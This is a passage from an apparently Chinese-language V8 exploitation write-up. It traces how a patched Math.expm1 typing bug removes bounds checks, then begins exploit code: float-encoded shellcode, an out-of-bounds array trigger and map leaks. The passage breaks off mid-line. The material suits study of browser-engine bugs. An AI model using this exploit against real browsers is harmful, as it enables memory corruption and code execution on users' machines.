<li>OtherUnsigned31（OU31）: <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><msup><mn>2</mn><mn>30</mn></msup><mo separator="true">,</mo><msup><mn>2</mn><mn>31</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">[2^{30},2^{31})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">30</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">31</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></li>
<li>OtherUnsigned32（OU32）: <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><msup><mn>2</mn><mn>31</mn></msup><mo separator="true">,</mo><msup><mn>2</mn><mn>32</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">[2^{31},2^{32})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">31</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">32</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></li>
<li>Integral32：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo stretchy="false">[</mo><mo>−</mo><msup><mn>2</mn><mn>31</mn></msup><mo separator="true">,</mo><msup><mn>2</mn><mn>32</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">[−2^{31},2^{32})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord">−</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">31</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">32</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></li>
<li>PlainNumber：任何浮点数，不包括 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>−</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">−0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">−</span><span class="mord">0</span></span></span></span></li>
<li>Number：任何浮点数，包括 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>−</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">−0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">−</span><span class="mord">0</span></span></span></span>、<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>NaN</mtext></mrow><annotation encoding="application/x-tex">\text{NaN}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord text"><span class="mord">NaN</span></span></span></span></span></li>
<li>Numeric：任何浮点数，包括 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>−</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">−0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">−</span><span class="mord">0</span></span></span></span>、<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>NaN</mtext></mrow><annotation encoding="application/x-tex">\text{NaN}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord text"><span class="mord">NaN</span></span></span></span></span> 以及 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>BigInt</mtext></mrow><annotation encoding="application/x-tex">\text{BigInt}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord text"><span class="mord">BigInt</span></span></span></span></span></li>
</ul>
<p>根据前面的分析，下面这段 js 代码中 <code>console.log(foo(-0))</code> 应该输出 <code>false</code> 。然而实际运行的结果却是 <code>true</code> 。</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params">x</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Object</span>.<span class="title function_">is</span>(<span class="title class_">Math</span>.<span class="title function_">expm1</span>(x), -<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">foo</span>(<span class="number">0</span>);</span><br><span class="line">% <span class="title class_">OptimizeFunctionOnNextCall</span>(foo);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">foo</span>(-<span class="number">0</span>));</span><br></pre></td></tr></table></figure></div>
<p>分析优化过程发现 <code>Math.expm1</code> 被初始成 <code>NumberExpm1</code> 并且在 simplified lowering 被替换为 <code>Float64Expm1</code> 。这个函数的返回值为 <code>Number</code> 类型，因此可以返回 -0 。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/9c774edef143b023790941a7a0d5403b.png"
                      alt="在这里插入图片描述"
                ><br>为了避免出现上述情况，我们在向 <code>foo</code> 函数传入字符串类型参数，此时输出结果变为 <code>false</code> 。</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params">x</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Object</span>.<span class="title function_">is</span>(<span class="title class_">Math</span>.<span class="title function_">expm1</span>(x), -<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">foo</span>(<span class="number">0</span>);</span><br><span class="line">% <span class="title class_">OptimizeFunctionOnNextCall</span>(foo);</span><br><span class="line"><span class="title function_">foo</span>(<span class="string">&quot;0&quot;</span>);</span><br><span class="line">% <span class="title class_">OptimizeFunctionOnNextCall</span>(foo);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">foo</span>(-<span class="number">0</span>));</span><br></pre></td></tr></table></figure></div>
<p>可以看到 typer 优化阶段后 <code>Math.expm1</code> 返回值类型被判断为 <code>PlainNumber</code> 或 <code>NaN</code> ，与前面的 patch 内容相符。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/4555ae74d8eb9ad733dcf5009665d5ed.png"
                      alt="在这里插入图片描述"
                ><br>这里可以看到 <code>Object.is</code> 被优化为 <code>SameValue</code> 。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ES section #sec-object.is</span></span><br><span class="line"><span class="function">Reduction <span class="title">JSCallReducer::ReduceObjectIs</span><span class="params">(Node* node)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">DCHECK_EQ</span>(IrOpcode::kJSCall, node-&gt;<span class="built_in">opcode</span>());</span><br><span class="line">  CallParameters <span class="type">const</span>&amp; params = <span class="built_in">CallParametersOf</span>(node-&gt;<span class="built_in">op</span>());</span><br><span class="line">  <span class="type">int</span> <span class="type">const</span> argc = <span class="built_in">static_cast</span>&lt;<span class="type">int</span>&gt;(params.<span class="built_in">arity</span>() - <span class="number">2</span>);</span><br><span class="line">  Node* lhs = (argc &gt;= <span class="number">1</span>) ? NodeProperties::<span class="built_in">GetValueInput</span>(node, <span class="number">2</span>)</span><br><span class="line">                          : <span class="built_in">jsgraph</span>()-&gt;<span class="built_in">UndefinedConstant</span>();</span><br><span class="line">  Node* rhs = (argc &gt;= <span class="number">2</span>) ? NodeProperties::<span class="built_in">GetValueInput</span>(node, <span class="number">3</span>)</span><br><span class="line">                          : <span class="built_in">jsgraph</span>()-&gt;<span class="built_in">UndefinedConstant</span>();</span><br><span class="line">  Node* value = <span class="built_in">graph</span>()-&gt;<span class="built_in">NewNode</span>(<span class="built_in">simplified</span>()-&gt;<span class="built_in">SameValue</span>(), lhs, rhs);</span><br><span class="line">  <span class="built_in">ReplaceWithValue</span>(node, value);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Replace</span>(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>搜索 <code>JSCallReducer</code> 发现这个优化位于 <code>InliningPhase</code> 阶段。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">InliningPhase</span> &#123;</span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">Run</span><span class="params">(PipelineData* data, Zone* temp_zone)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="function">JSCallReducer <span class="title">call_reducer</span><span class="params">(&amp;graph_reducer, data-&gt;jsgraph(), data-&gt;broker(),</span></span></span><br><span class="line"><span class="params"><span class="function">                               data-&gt;info()-&gt;is_bailout_on_uninitialized()</span></span></span><br><span class="line"><span class="params"><span class="function">                                   ? JSCallReducer::kBailoutOnUninitialized</span></span></span><br><span class="line"><span class="params"><span class="function">                                   : JSCallReducer::kNoFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">                               data-&gt;dependencies())</span></span>;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>另外搜索 <code>SameValue</code> 发现存在如下优化：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">Reduction <span class="title">TypedOptimization::ReduceSameValue</span><span class="params">(Node* node)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">DCHECK_EQ</span>(IrOpcode::kSameValue, node-&gt;<span class="built_in">opcode</span>());</span><br><span class="line">  Node* <span class="type">const</span> lhs = NodeProperties::<span class="built_in">GetValueInput</span>(node, <span class="number">0</span>);</span><br><span class="line">  Node* <span class="type">const</span> rhs = NodeProperties::<span class="built_in">GetValueInput</span>(node, <span class="number">1</span>);</span><br><span class="line">  Type <span class="type">const</span> lhs_type = NodeProperties::<span class="built_in">GetType</span>(lhs);</span><br><span class="line">  Type <span class="type">const</span> rhs_type = NodeProperties::<span class="built_in">GetType</span>(rhs);</span><br><span class="line">  <span class="keyword">if</span> (lhs == rhs) &#123;</span><br><span class="line">    <span class="comment">// SameValue(x,x) =&gt; #true</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Replace</span>(<span class="built_in">jsgraph</span>()-&gt;<span class="built_in">TrueConstant</span>());</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (lhs_type.<span class="built_in">Is</span>(Type::<span class="built_in">Unique</span>()) &amp;&amp; rhs_type.<span class="built_in">Is</span>(Type::<span class="built_in">Unique</span>())) &#123;</span><br><span class="line">    <span class="comment">// SameValue(x:unique,y:unique) =&gt; ReferenceEqual(x,y)</span></span><br><span class="line">    NodeProperties::<span class="built_in">ChangeOp</span>(node, <span class="built_in">simplified</span>()-&gt;<span class="built_in">ReferenceEqual</span>());</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Changed</span>(node);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (lhs_type.<span class="built_in">Is</span>(Type::<span class="built_in">String</span>()) &amp;&amp; rhs_type.<span class="built_in">Is</span>(Type::<span class="built_in">String</span>())) &#123;</span><br><span class="line">    <span class="comment">// SameValue(x:string,y:string) =&gt; StringEqual(x,y)</span></span><br><span class="line">    NodeProperties::<span class="built_in">ChangeOp</span>(node, <span class="built_in">simplified</span>()-&gt;<span class="built_in">StringEqual</span>());</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Changed</span>(node);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (lhs_type.<span class="built_in">Is</span>(Type::<span class="built_in">MinusZero</span>())) &#123;</span><br><span class="line">    <span class="comment">// SameValue(x:minus-zero,y) =&gt; ObjectIsMinusZero(y)</span></span><br><span class="line">    node-&gt;<span class="built_in">RemoveInput</span>(<span class="number">0</span>);</span><br><span class="line">    NodeProperties::<span class="built_in">ChangeOp</span>(node, <span class="built_in">simplified</span>()-&gt;<span class="built_in">ObjectIsMinusZero</span>());</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Changed</span>(node);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (rhs_type.<span class="built_in">Is</span>(Type::<span class="built_in">MinusZero</span>())) &#123;</span><br><span class="line">    <span class="comment">// SameValue(x,y:minus-zero) =&gt; ObjectIsMinusZero(x)</span></span><br><span class="line">    node-&gt;<span class="built_in">RemoveInput</span>(<span class="number">1</span>);</span><br><span class="line">    NodeProperties::<span class="built_in">ChangeOp</span>(node, <span class="built_in">simplified</span>()-&gt;<span class="built_in">ObjectIsMinusZero</span>());</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Changed</span>(node);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (lhs_type.<span class="built_in">Is</span>(Type::<span class="built_in">NaN</span>())) &#123;</span><br><span class="line">    <span class="comment">// SameValue(x:nan,y) =&gt; ObjectIsNaN(y)</span></span><br><span class="line">    node-&gt;<span class="built_in">RemoveInput</span>(<span class="number">0</span>);</span><br><span class="line">    NodeProperties::<span class="built_in">ChangeOp</span>(node, <span class="built_in">simplified</span>()-&gt;<span class="built_in">ObjectIsNaN</span>());</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Changed</span>(node);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (rhs_type.<span class="built_in">Is</span>(Type::<span class="built_in">NaN</span>())) &#123;</span><br><span class="line">    <span class="comment">// SameValue(x,y:nan) =&gt; ObjectIsNaN(x)</span></span><br><span class="line">    node-&gt;<span class="built_in">RemoveInput</span>(<span class="number">1</span>);</span><br><span class="line">    NodeProperties::<span class="built_in">ChangeOp</span>(node, <span class="built_in">simplified</span>()-&gt;<span class="built_in">ObjectIsNaN</span>());</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Changed</span>(node);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (lhs_type.<span class="built_in">Is</span>(Type::<span class="built_in">PlainNumber</span>()) &amp;&amp;</span><br><span class="line">             rhs_type.<span class="built_in">Is</span>(Type::<span class="built_in">PlainNumber</span>())) &#123;</span><br><span class="line">    <span class="comment">// SameValue(x:plain-number,y:plain-number) =&gt; NumberEqual(x,y)</span></span><br><span class="line">    NodeProperties::<span class="built_in">ChangeOp</span>(node, <span class="built_in">simplified</span>()-&gt;<span class="built_in">NumberEqual</span>());</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Changed</span>(node);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">NoChange</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>搜索 <code>TypedOptimization</code> 发现在 typed lowering 和 load elimination 阶段调用了该优化。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">TypedLoweringPhase</span> &#123;</span><br><span class="line">  <span class="function"><span class="type">static</span> <span class="type">const</span> <span class="type">char</span>* <span class="title">phase_name</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="string">&quot;typed lowering&quot;</span>; &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">Run</span><span class="params">(PipelineData* data, Zone* temp_zone)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="function">TypedOptimization <span class="title">typed_optimization</span><span class="params">(&amp;graph_reducer, data-&gt;dependencies(),</span></span></span><br><span class="line"><span class="params"><span class="function">                                         data-&gt;jsgraph(), data-&gt;broker())</span></span>;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">LoadEliminationPhase</span> &#123;</span><br><span class="line">  <span class="function"><span class="type">static</span> <span class="type">const</span> <span class="type">char</span>* <span class="title">phase_name</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> <span class="string">&quot;load elimination&quot;</span>; &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">Run</span><span class="params">(PipelineData* data, Zone* temp_zone)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="function">TypedOptimization <span class="title">typed_optimization</span><span class="params">(&amp;graph_reducer, data-&gt;dependencies(),</span></span></span><br><span class="line"><span class="params"><span class="function">                                         data-&gt;jsgraph(), data-&gt;broker())</span></span>;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<p>在 <code>foo</code> 函数的第一次优化的 typed lowering 阶段 <code>SameValue</code> 被替换为 <code>ObjectIsMinusZero</code> 。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/0a24359e5f939d4c8551a234cc07e2db.png"
                      alt="在这里插入图片描述"
                ><br>而在第二次优化时由于 <code>Math.expm1</code> 返回值一定不是 -0 因此 typed lowering 阶段 <code>SameValue</code> 被替换为 <code>false</code> 。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/d1c0055602cf681c9bd6b3422f61bf99.png"
                      alt="在这里插入图片描述"
                ><br>接下来我们尝试用 <code>Object.is</code> 的返回值来访问 <code>JSArray</code> 。</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params">x</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> oob_array = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>, <span class="number">4.4</span>]</span><br><span class="line">    <span class="keyword">let</span> index = <span class="title class_">Object</span>.<span class="title function_">is</span>(<span class="title class_">Math</span>.<span class="title function_">expm1</span>(x), -<span class="number">0</span>);</span><br><span class="line">    index *= <span class="number">1337</span>;</span><br><span class="line">    <span class="keyword">return</span> oob_array[index];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">foo</span>(<span class="number">0</span>);</span><br><span class="line">% <span class="title class_">OptimizeFunctionOnNextCall</span>(foo);</span><br><span class="line"><span class="title function_">foo</span>(<span class="string">&quot;0&quot;</span>);</span><br><span class="line">% <span class="title class_">OptimizeFunctionOnNextCall</span>(foo);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">foo</span>(-<span class="number">0</span>));</span><br></pre></td></tr></table></figure></div>
<p>发现由于 v8 认为用 <code>SameValue</code> 返回值计算出的 <code>index</code> 总是为 0 因此在 simplified lowering 阶段将 <code>CheckBound</code> 优化掉了。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/c4f24a562996c0a318aeac9e8ade8c96.png"
                      alt="在这里插入图片描述"
                ><br>然而我们可以通过某种手段使得 <code>Object.is</code> 返回 <code>true</code> 。</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params">x</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> aux = &#123; <span class="attr">mz</span>: -<span class="number">0</span> &#125;;</span><br><span class="line">    <span class="keyword">let</span> index = <span class="title class_">Object</span>.<span class="title function_">is</span>(<span class="title class_">Math</span>.<span class="title function_">expm1</span>(x), aux.<span class="property">mz</span>);</span><br><span class="line">    <span class="keyword">let</span> oob_array = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>, <span class="number">4.4</span>]</span><br><span class="line">    index *= <span class="number">1337</span>;</span><br><span class="line">    <span class="keyword">return</span> oob_array[index];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">foo</span>(<span class="number">0</span>);</span><br><span class="line">% <span class="title class_">OptimizeFunctionOnNextCall</span>(foo);</span><br><span class="line"><span class="title function_">foo</span>(<span class="string">&quot;0&quot;</span>);</span><br><span class="line">% <span class="title class_">OptimizeFunctionOnNextCall</span>(foo);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">foo</span>(-<span class="number">0</span>));</span><br></pre></td></tr></table></figure></div>
<p>由于 -0 被放到一个 <code>JSObject</code> 的一个属性中，因此即使到了 load elimination 阶段依旧没有吧 <code>SameValue</code> 优化成 <code>false</code> 。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/746bb8d8f277526cbfab70ab11cfa495.png"
                      alt="在这里插入图片描述"
                ><br>到了 escape analysis 阶段 <code>LoadField</code> 从 <code>JSObject</code> 获取属性的操作被优化为立即数 -0 。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/f1398ecafb6f42b8314fc0e08e429301.png"
                      alt="在这里插入图片描述"
                ><br>到了 simplified lowering 阶段，v8 根据 <code>Math.expm1</code> 返回值一定不是 -0 将后面的 <code>CheckBounds</code> 操作优化掉。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/0a7a5924c3c41c17750ff1d82afe9ef7.png"
                      alt="在这里插入图片描述"
                ><br><strong>然而 <code>Math.expm1</code> 不会返回 -0 是 patch 上去的内容，实际上 <code>Math.expm1</code> 是可以返回 -0 ，至于前面的 <code>Object.is</code> 返回 <code>false</code> 是因为返回值被优化成立即数 <code>false</code> 。</strong></p>
<p>因此可以越界访问数组 <code>oob_array</code> 。</p>
<h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> array_buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(array_buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setFloat64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getBigUint64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getFloat64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + val.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">shellcode</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        <span class="number">1.930800574428816e-246</span>,</span><br><span class="line">        <span class="number">1.9710610293119303e-246</span>,</span><br><span class="line">        <span class="number">1.9580046981136086e-246</span>,</span><br><span class="line">        <span class="number">1.9533830734556562e-246</span>,</span><br><span class="line">        <span class="number">1.961642575273437e-246</span>,</span><br><span class="line">        <span class="number">1.9399842868403466e-246</span>,</span><br><span class="line">        <span class="number">1.9627709291878714e-246</span>,</span><br><span class="line">        <span class="number">1.9711826272864685e-246</span>,</span><br><span class="line">        <span class="number">1.9954775598492772e-246</span>,</span><br><span class="line">        <span class="number">2.000505685241573e-246</span>,</span><br><span class="line">        <span class="number">1.9535148279508375e-246</span>,</span><br><span class="line">        <span class="number">1.9895153917617124e-246</span>,</span><br><span class="line">        <span class="number">1.9539853963090317e-246</span>,</span><br><span class="line">        <span class="number">1.9479373016495106e-246</span>,</span><br><span class="line">        <span class="number">1.97118242283721e-246</span>,</span><br><span class="line">        <span class="number">1.95323825426926e-246</span>,</span><br><span class="line">        <span class="number">1.99113905582155e-246</span>,</span><br><span class="line">        <span class="number">1.9940808572858186e-246</span>,</span><br><span class="line">        <span class="number">1.9537941682504095e-246</span>,</span><br><span class="line">        <span class="number">1.930800151635891e-246</span>,</span><br><span class="line">        <span class="number">1.932214185322047e-246</span></span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x40000</span>; i++) &#123;</span><br><span class="line">    <span class="title function_">shellcode</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> oob_array = [<span class="number">.1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">trigger</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">foo</span>(<span class="params">x</span>) &#123;</span><br><span class="line">        <span class="keyword">let</span> aux = &#123; <span class="attr">mz</span>: -<span class="number">0</span> &#125;;</span><br><span class="line">        <span class="keyword">let</span> index = <span class="title class_">Object</span>.<span class="title function_">is</span>(<span class="title class_">Math</span>.<span class="title function_">expm1</span>(x), aux.<span class="property">mz</span>);</span><br><span class="line">        oob_array = [<span class="number">.1</span>]</span><br><span class="line">        index *= <span class="number">4</span>;</span><br><span class="line">        oob_array[index] = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x40000</span>; i++) &#123;</span><br><span class="line">        <span class="title function_">foo</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x40000</span>; i++) &#123;</span><br><span class="line">        <span class="title function_">foo</span>(<span class="string">&quot;0&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">foo</span>(-<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">trigger</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> object_array = [&#123;&#125;];</span><br><span class="line"><span class="keyword">var</span> double_array = [<span class="number">.1</span>];</span><br><span class="line"><span class="keyword">var</span> rw_array = [<span class="number">.1</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> object_array_map = <span class="title function_">d2u</span>(oob_array[<span class="number">15</span>]);</span><br><span class="line"><span class="keyword">var</span> double_array_map = <span class="title function_">d2u</span>(oob_array[<span 